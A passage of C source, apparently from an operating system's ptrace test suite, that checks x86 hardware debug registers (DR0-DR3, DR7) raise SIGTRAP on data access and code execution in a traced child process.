	dbregs_trap_variable(3, 3, 3, true);
}

ATF_TC(dbregs_dr0_trap_variable_readwrite_read_byte);
ATF_TC_HEAD(dbregs_dr0_trap_variable_readwrite_read_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data read/write trap in write 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_readwrite_read_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(0, 3, 0, false);
}

ATF_TC(dbregs_dr1_trap_variable_readwrite_read_byte);
ATF_TC_HEAD(dbregs_dr1_trap_variable_readwrite_read_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data read/write trap in write 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_readwrite_read_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(1, 3, 0, false);
}

ATF_TC(dbregs_dr2_trap_variable_readwrite_read_byte);
ATF_TC_HEAD(dbregs_dr2_trap_variable_readwrite_read_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data read/write trap in write 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_readwrite_read_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(2, 3, 0, false);
}

ATF_TC(dbregs_dr3_trap_variable_readwrite_read_byte);
ATF_TC_HEAD(dbregs_dr3_trap_variable_readwrite_read_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data read/write trap in write 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_readwrite_read_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(3, 3, 0, false);
}

ATF_TC(dbregs_dr0_trap_variable_readwrite_read_2bytes);
ATF_TC_HEAD(dbregs_dr0_trap_variable_readwrite_read_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data read/write trap in write 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_readwrite_read_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(0, 3, 1, false);
}

ATF_TC(dbregs_dr1_trap_variable_readwrite_read_2bytes);
ATF_TC_HEAD(dbregs_dr1_trap_variable_readwrite_read_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data read/write trap in write 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_readwrite_read_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(1, 3, 1, false);
}

ATF_TC(dbregs_dr2_trap_variable_readwrite_read_2bytes);
ATF_TC_HEAD(dbregs_dr2_trap_variable_readwrite_read_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data read/write trap in write 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_readwrite_read_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(2, 3, 1, false);
}

ATF_TC(dbregs_dr3_trap_variable_readwrite_read_2bytes);
ATF_TC_HEAD(dbregs_dr3_trap_variable_readwrite_read_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data read/write trap in write 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_readwrite_read_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(3, 3, 1, false);
}

ATF_TC(dbregs_dr0_trap_variable_readwrite_read_4bytes);
ATF_TC_HEAD(dbregs_dr0_trap_variable_readwrite_read_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data read/write trap in write 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_readwrite_read_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(0, 3, 3, false);
}

ATF_TC(dbregs_dr1_trap_variable_readwrite_read_4bytes);
ATF_TC_HEAD(dbregs_dr1_trap_variable_readwrite_read_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data read/write trap in write 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_readwrite_read_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(1, 3, 3, false);
}

ATF_TC(dbregs_dr2_trap_variable_readwrite_read_4bytes);
ATF_TC_HEAD(dbregs_dr2_trap_variable_readwrite_read_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data read/write trap in write 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_readwrite_read_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(2, 3, 3, false);
}

ATF_TC(dbregs_dr3_trap_variable_readwrite_read_4bytes);
ATF_TC_HEAD(dbregs_dr3_trap_variable_readwrite_read_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data read/write trap in write 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_readwrite_read_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(3, 3, 3, false);
}

#if defined(HAVE_DBREGS)
ATF_TC(dbregs_dr0_trap_code);
ATF_TC_HEAD(dbregs_dr0_trap_code, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on code execution trap)");
}

ATF_TC_BODY(dbregs_dr0_trap_code, tc)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	struct dbreg r1;
	size_t i;
	volatile int watchme = 1;
	union u dr7;

	struct ptrace_siginfo info;
	memset(&info, 0, sizeof(info));

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	dr7.raw = 0;
	dr7.bits.global_dr0_breakpoint = 1;
	dr7.bits.condition_dr0 = 0;	/* 0b00 -- break on code execution */
	dr7.bits.len_dr0 = 0;		/* 0b00 -- 1 byte */

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		printf("check_happy(%d)=%d\n", watchme, check_happy(watchme));

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[0] = (long)(intptr_t)check_happy;
	DPRINTF("Set DR0 (r1.dr[0]) to new value %" PRIxREGISTER "\n",
	    r1.dr[0]);

	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, SIGTRAP);

	DPRINTF("Before calling ptrace(2) with PT_GET_SIGINFO for child\n");
	SYSCALL_REQUIRE(ptrace(PT_GET_SIGINFO, child, &info, sizeof(info)) != -1);

	DPRINTF("Signal traced to lwpid=%d\n", info.psi_lwpid);
	DPRINTF("Signal properties: si_signo=%#x si_code=%#x si_errno=%#x\n",
	    info.psi_siginfo.si_signo, info.psi_siginfo.si_code,
	    info.psi_siginfo.si_errno);

	DPRINTF("Before checking siginfo_t\n");
	ATF_REQUIRE_EQ(info.psi_siginfo.si_signo, SIGTRAP);
	ATF_REQUIRE_EQ(info.psi_siginfo.si_code, TRAP_DBREG);

	DPRINTF("Remove code trap from check_happy=%p\n", check_happy);
	dr7.bits.global_dr0_breakpoint = 0;
	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}
#endif

#if defined(HAVE_DBREGS)
ATF_TC(dbregs_dr1_trap_code);
ATF_TC_HEAD(dbregs_dr1_trap_code, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on code execution trap)");
}

ATF_TC_BODY(dbregs_dr1_trap_code, tc)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	struct dbreg r1;
	size_t i;
	volatile int watchme = 1;
	union u dr7;

	struct ptrace_siginfo info;
	memset(&info, 0, sizeof(info));

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	dr7.raw = 0;
	dr7.bits.global_dr1_breakpoint = 1;
	dr7.bits.condition_dr1 = 0;	/* 0b00 -- break on code execution */
	dr7.bits.len_dr1 = 0;		/* 0b00 -- 1 byte */

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		printf("check_happy(%d)=%d\n", watchme, check_happy(watchme));

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[1] = (long)(intptr_t)check_happy;
	DPRINTF("Set DR1 (r1.dr[1]) to new value %" PRIxREGISTER "\n",
	    r1.dr[1]);

	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, SIGTRAP);

	DPRINTF("Before calling ptrace(2) with PT_GET_SIGINFO for child\n");
	SYSCALL_REQUIRE(ptrace(PT_GET_SIGINFO, child, &info, sizeof(info)) != -1);

	DPRINTF("Signal traced to lwpid=%d\n", info.psi_lwpid);
	DPRINTF("Signal properties: si_signo=%#x si_code=%#x si_errno=%#x\n",
	    info.psi_siginfo.si_signo, info.psi_siginfo.si_code,
	    info.psi_siginfo.si_errno);

	DPRINTF("Before checking siginfo_t\n");
	ATF_REQUIRE_EQ(info.psi_siginfo.si_signo, SIGTRAP);
	ATF_REQUIRE_EQ(info.psi_siginfo.si_code, TRAP_DBREG);

	DPRINTF("Remove code trap from check_happy=%p\n", check_happy);
	dr7.bits.global_dr1_breakpoint = 0;
	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}
#endif

#if defined(HAVE_DBREGS)
ATF_TC(dbregs_dr2_trap_code);
ATF_TC_HEAD(dbregs_dr2_trap_code, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on code execution trap)");
}

ATF_TC_BODY(dbregs_dr2_trap_code, tc)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	struct dbreg r1;
	size_t i;
	volatile int watchme = 1;
	union u dr7;

	struct ptrace_siginfo info;
	memset(&info, 0, sizeof(info));

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	dr7.raw = 0;
	dr7.bits.global_dr2_breakpoint = 1;
	dr7.bits.condition_dr2 = 0;	/* 0b00 -- break on code execution */
	dr7.bits.len_dr2 = 0;		/* 0b00 -- 1 byte */

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		printf("check_happy(%d)=%d\n", watchme, check_happy(watchme));

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[2] = (long)(intptr_t)check_happy;
	DPRINTF("Set DR2 (r1.dr[2]) to new value %" PRIxREGISTER "\n",
	    r1.dr[2]);

	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, SIGTRAP);

	DPRINTF("Before calling ptrace(2) with PT_GET_SIGINFO for child\n");
	SYSCALL_REQUIRE(ptrace(PT_GET_SIGINFO, child, &info, sizeof(info)) != -1);

	DPRINTF("Signal traced to lwpid=%d\n", info.psi_lwpid);
	DPRINTF("Signal properties: si_signo=%#x si_code=%#x si_errno=%#x\n",
	    info.psi_siginfo.si_signo, info.psi_siginfo.si_code,
	    info.psi_siginfo.si_errno);

	DPRINTF("Before checking siginfo_t\n");
	ATF_REQUIRE_EQ(info.psi_siginfo.si_signo, SIGTRAP);
	ATF_REQUIRE_EQ(info.psi_siginfo.si_code, TRAP_DBREG);

	DPRINTF("Remove code trap from check_happy=%p\n", check_happy);
	dr7.bits.global_dr2_breakpoint = 0;
	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}
#endif

#if defined(HAVE_DBREGS)
ATF_TC(dbregs_dr3_trap_code);
ATF_TC_HEAD(dbregs_dr3_trap_code, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on code execution trap)");
}

ATF_TC_BODY(dbregs_dr3_trap_code, tc)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	struct dbreg r1;
	size_t i;
	volatile int watchme = 1;
	union u dr7;

	struct ptrace_siginfo info;
	memset(&info, 0, sizeof(info));

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	dr7.raw = 0;
	dr7.bits.global_dr3_breakpoint = 1;
	dr7.bits.condition_dr3 = 0;	/* 0b00 -- break on code execution */
	dr7.bits.len_dr3 = 0;		/* 0b00 -- 1 byte */

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		printf("check_happy(%d)=%d\n", watchme, check_happy(watchme));

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[3] = (long)(intptr_t)check_happy;
	DPRINTF("Set DR3 (r1.dr[3]) to new value %" PRIxREGISTER "\n",
	    r1.dr[3]);

	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, SIGTRAP);

	DPRINTF("Before calling ptrace(2) with PT_GET_SIGINFO for child\n");
	SYSCALL_REQUIRE(ptrace(PT_GET_SIGINFO, child, &info, sizeof(info)) != -1);

	DPRINTF("Signal traced to lwpid=%d\n", info.psi_lwpid);
	DPRINTF("Signal properties: si_signo=%#x si_code=%#x si_errno=%#x\n",
	    info.psi_siginfo.si_signo, info.psi_siginfo.si_code,
	    info.psi_siginfo.si_errno);

	DPRINTF("Before checking siginfo_t\n");
	ATF_REQUIRE_EQ(info.psi_siginfo.si_signo, SIGTRAP);
	ATF_REQUIRE_EQ(info.psi_siginfo.si_code, TRAP_DBREG);

	DPRINTF("Remove code trap from check_happy=%p\n", check_happy);
	dr7.bits.global_dr3_breakpoint = 0;
	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}
#endif

volatile lwpid_t x86_the_lwp_id = 0;

static void __used
x86_lwp_main_func(void *arg)
{
	x86_the_lwp_id = _lwp_self();
	_lwp_exit();
}

static void
dbregs_dont_inherit_lwp(int reg)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	ptrace_state_t state;
	const int slen = sizeof(state);
	ptrace_event_t event;
	const int elen = sizeof(event);
	ucontext_t uc;
	lwpid_t lid;
	static const size_t ssize = 16*1024;
	void *stack;
	size_t i;
	struct dbreg r1;
	struct dbreg r2;

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before allocating memory for stack in child\n");
		FORKEE_ASSERT((stack = malloc(ssize)) != NULL);

		DPRINTF("Before making context for new lwp in child\n");
		_lwp_makecontext(&uc, x86_lwp_main_func, NULL, NULL, stack,
		    ssize);

		DPRINTF("Before creating new in child\n");
		FORKEE_ASSERT(_lwp_create(&uc, 0, &lid) == 0);

		DPRINTF("Before waiting for lwp %d to exit\n", lid);
		FORKEE_ASSERT(_lwp_wait(lid, NULL) == 0);

		DPRINTF("Before verifying that reported %d and running lid %d "
		    "are the same\n", lid, x86_the_lwp_id);
		FORKEE_ASSERT_EQ(lid, x86_the_lwp_id);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Set empty EVENT_MASK for the child %d\n", child);
	event.pe_set_event = PTRACE_LWP_CREATE;
	SYSCALL_REQUIRE(ptrace(PT_SET_EVENT_MASK, child, &event, elen) != -1);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[reg] = (long)(intptr_t)check_happy;
	DPRINTF("Set DR%d (r1.dr[%d]) to new value %" PRIxREGISTER "\n",
	    reg, reg, r1.dr[0]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
